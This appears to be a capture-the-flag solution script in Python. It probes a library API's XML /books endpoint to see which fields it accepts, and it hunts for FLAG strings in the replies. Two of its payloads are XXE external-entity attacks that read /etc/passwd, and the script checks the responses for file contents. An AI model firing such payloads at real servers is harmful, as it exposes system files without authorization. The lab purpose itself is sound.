import requests
import time
import sys

# Configuration - single endpoint from context
base_url = "http://library.deadend/books"
headers = {"Content-Type": "application/xml"}

# Simple test payloads focusing on key approaches
test_payloads = [
    {
        "name": "ISBN as nested element",
        "payload": '<?xml version="1.0"?><book><title>Test</title><author>Tester</author><isbn>978-0-0-0</isbn></book>'
    },
    {
        "name": "ISBN as attribute",
        "payload": '<?xml version="1.0"?><book isbn="978-0-0-0"><title>Test</title><author>Tester</author></book>'
    },
    {
        "name": "ISBN in title field",
        "payload": '<?xml version="1.0"?><book><title>Test ISBN:978-0-0-0</title><author>Tester</author></book>'
    },
    {
        "name": "ISBN in author field", 
        "payload": '<?xml version="1.0"?><book><title>Test</title><author>Tester ISBN:978-0-0-0</author></book>'
    },
    {
        "name": "Test publisher field",
        "payload": '<?xml version="1.0"?><book><title>Test</title><author>Tester</author><publisher>Test Pub</publisher></book>'
    },
    {
        "name": "Test year field",
        "payload": '<?xml version="1.0"?><book><title>Test</title><author>Tester</author><year>2024</year></book>'
    },
    {
        "name": "XXE external entity",
        "payload": '<?xml version="1.0"?><!DOCTYPE b[<!ENTITY x SYSTEM "file:///etc/passwd">]><book><title>&x;</title><author>Tester</author></book>'
    },
    {
        "name": "XXE with ISBN",
        "payload": '<?xml version="1.0"?><!DOCTYPE b[<!ENTITY i SYSTEM "file:///etc/passwd">]><book><title>Test</title><author>Tester</author><isbn>&i;</isbn></book>'
    }
]

print("Testing /books endpoint for ISBN embedding methods")
print("=" * 60)

results = []

for idx, test in enumerate(test_payloads, 1):
    print(f"\n[Test {idx}] {test['name']}")
    print("-" * 60)
    
    try:
        # Add delay to avoid overwhelming the server
        if idx > 1:
            time.sleep(0.5)
            
        response = requests.post(
            base_url, 
            headers=headers, 
            data=test['payload'],
            timeout=30,
            verify=False
        )
        
        # Check response
        status = response.status_code
        response_text = response.text
        
        print(f"Status: {status}")
        print(f"Response: {response_text}")
        
        # Analyze result
        analysis = ""
        if status == 200:
            analysis += "[ACCEPTED] "
            if "isbn" in response_text.lower():
                analysis += "ISBN FIELD PRESENT IN RESPONSE! "
            if "publisher" in response_text.lower():
                analysis += "PUBLISHER FIELD SUPPORTED! "
            if "year" in response_text.lower():
                analysis += "YEAR FIELD SUPPORTED! "
        else:
            analysis += "[REJECTED] "
            if "error" in response_text.lower():
                analysis += f"Error: {response_text}"
        
        print(f"Analysis: {analysis}")
        
        # Store result
        results.append({
            'test': test['name'],
            'status': status,
            'response': response_text,
            'analysis': analysis
        })
        
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection Error: {str(e)}")
        print("[!] Target may be unreachable or refusing connections")
        results.append({'test': test['name'], 'error': 'ConnectionError'})
    except requests.exceptions.Timeout:
        print(f"[!] Timeout - server took too long to respond")
        results.append({'test': test['name'], 'error': 'Timeout'})
    except Exception as e:
        print(f"[!] Unexpected error: {str(e)}")
        results.append({'test': test['name'], 'error': str(e)})

# Summary
print(f"\n\n{'='*60}")
print("SUMMARY")
print("="*60)

success_count = sum(1 for r in results if r.get('status') == 200)
error_count = sum(1 for r in results if 'error' in r)

print(f"Total tests: {len(test_payloads)}")
print(f"Successful (200): {success_count}")
print(f"Errors: {error_count}")

# Check for ISBN support
isbn_found = any("ISBN FIELD PRESENT" in r.get('analysis', '') for r in results)
publisher_found = any("PUBLISHER FIELD SUPPORTED" in r.get('analysis', '') for r in results)
year_found = any("YEAR FIELD SUPPORTED" in r.get('analysis', '') for r in results)

print(f"\nField Support Detection:")
print(f"  ISBN field accepted: {'YES' if isbn_found else 'NO'}")
print(f"  Publisher field accepted: {'YES' if publisher_found else 'NO'}")
print(f"  Year field accepted: {'YES' if year_found else 'NO'}")

# Check for XXE vulnerability
xxe_vulnerable = any("root:" in r.get('response', '').lower() for r in results)
print(f"\nXXE Vulnerability: {'YES' if xxe_vulnerable else 'NO'}")

# Check for flags
import re
all_responses = [r.get('response', '') for r in results if 'response' in r]
flags = re.findall(r'FLAG\{[^}]+\}', ' '.join(all_responses))

if flags:
    print(f"\n[!] FLAGS FOUND: {flags}")
else:
    print(f"\n[ ] No flags found in responses")

print(f"\n{'='*60}")
print("Test execution complete")
